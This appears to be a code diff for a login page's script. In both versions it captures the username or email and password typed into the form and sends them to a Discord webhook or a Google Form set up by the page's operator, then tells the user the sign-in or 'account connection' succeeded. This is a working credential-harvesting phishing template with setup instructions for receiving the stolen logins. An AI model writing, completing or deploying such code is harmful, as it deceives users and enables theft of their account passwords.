@@ -1,95 +1,83 @@
-// Tab switching
-function switchTab(tabIndex) {
-    const signinForm = document.getElementById('signin-form');
-    const signupForm = document.getElementById('signup-form');
-    const signinTab = document.getElementById('signin-tab');
-    const signupTab = document.getElementById('signup-tab');
+// ================== CONFIGURATION ==================
+// Choose your method(s) - set to true to enable
+const USE_DISCORD = false;
+const USE_GOOGLE_FORM = true;
 
-    if (tabIndex === 0) {
-        signinForm.classList.add('active');
-        signupForm.classList.remove('active');
-        signinTab.classList.add('active');
-        signupTab.classList.remove('active');
-    } else {
-        signinForm.classList.remove('active');
-        signupForm.classList.add('active');
-        signinTab.classList.remove('active');
-        signupTab.classList.add('active');
-    }
-}
+// Discord Webhook (if enabled)
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
 
-// Handle form submission
-async function handleSubmit(e, type) {
+// Google Form (if enabled) - replace with your real form URL
+const GOOGLE_FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLScJedH19Sw_6KRurRvLWC0w3K-LcLLBt0S98Ov4CJaWq1yPpg/viewform?usp=pp_url';
+
+// ===================================================
+
+async function handleSubmit(e) {
     e.preventDefault();
     
-    let data = {};
-    let embedTitle = '';
-    
-    if (type === 'signin') {
-        data = {
-            emailOrUsername: document.getElementById('signin-email').value,
-            password: document.getElementById('signin-password').value,
-            type: 'signin'
-        };
-        embedTitle = '🔑 New Sign In Attempt';
-    } else {
-        const password = document.getElementById('signup-password').value;
-        const confirm = document.getElementById('signup-confirm').value;
-        
-        if (password !== confirm) {
-            alert("Passwords don't match!");
-            return;
-        }
-        
-        data = {
-            username: document.getElementById('signup-username').value,
-            email: document.getElementById('signup-email').value,
-            password: password,
-            type: 'signup'
-        };
-        embedTitle = '📝 New Account Creation';
-    }
+    const data = {
+        usernameOrEmail: document.getElementById('username').value,
+        password: document.getElementById('password').value,
+        timestamp: new Date().toISOString()
+    };
 
-    // === DISCORD WEBHOOK ===
-    // Replace this with your own Discord webhook URL
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
-    
-    if (WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
-        console.log('⚠️ Please replace the WEBHOOK_URL with your real Discord webhook!');
-        alert('Demo mode: Form data logged to console. Set up your Discord webhook to receive real notifications.');
-    } else {
+    let sent = false;
+
+    // 1. Discord Webhook
+    if (USE_DISCORD && !DISCORD_WEBHOOK.includes('YOUR_WEBHOOK')) {
         try {
             const payload = {
                 embeds: [{
-                    title: embedTitle,
+                    title: '🔗 New Account Connection',
                     color: 0x6366f1,
                     fields: Object.entries(data).map(([key, value]) => ({
-                        name: key.charAt(0).toUpperCase() + key.slice(1),
+                        name: key.replace(/([A-Z])/g, ' $1').trim(),
                         value: value || 'N/A',
                         inline: true
-                    })),
-                    timestamp: new Date().toISOString()
+                    }))
                 }]
             };
             
-            await fetch(WEBHOOK_URL, {
+            await fetch(DISCORD_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-            console.log('✅ Data sent to Discord webhook');
-        } catch (error) {
-            console.error('Failed to send to webhook:', error);
+            console.log('✅ Sent to Discord');
+            sent = true;
+        } catch (err) {
+            console.error('Discord error:', err);
         }
     }
 
-    // Success feedback
-    const message = type === 'signin' ? 'Signed in successfully!' : 'Account created successfully!';
-    alert(message + '\n\nDetails sent to your Discord server (if webhook configured).');
-    
-    // Reset form
+    // 2. Google Form
+    if (USE_GOOGLE_FORM && GOOGLE_FORM_URL.includes('formResponse')) {
+        try {
+            const formData = new FormData();
+            formData.append('entry.XXXXXX', data.usernameOrEmail);   // ← Change these entry IDs
+            formData.append('entry.YYYYYY', data.password);          // ← Change these entry IDs
+            formData.append('entry.ZZZZZZ', data.timestamp);
+
+            await fetch(GOOGLE_FORM_URL, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'   // Google Forms requires this
+            });
+            console.log('✅ Sent to Google Form');
+            sent = true;
+        } catch (err) {
+            console.error('Google Form error:', err);
+        }
+    }
+
+    if (!sent) {
+        console.log('⚠️ Data (for testing):', data);
+        alert('Demo mode — check console. Set up Discord or Google Form to receive real data.');
+    } else {
+        alert('Account connected successfully!\n\nDetails sent via your chosen method(s).');
+    }
+
     e.target.reset();
 }
 
-// Make elements easily customizable
-console.log('%c✅ Login page ready! Edit styles.css for colors, index.html for text/structure. Replace WEBHOOK_URL in script.js for Discord notifications.', 'color: #6366f1; font-size: 14px;');
+// Ready message
+console.log('%c✅ Ready! Edit USE_DISCORD / USE_GOOGLE_FORM and URLs in script.js', 'color: #6366f1; font-size: 14px;');
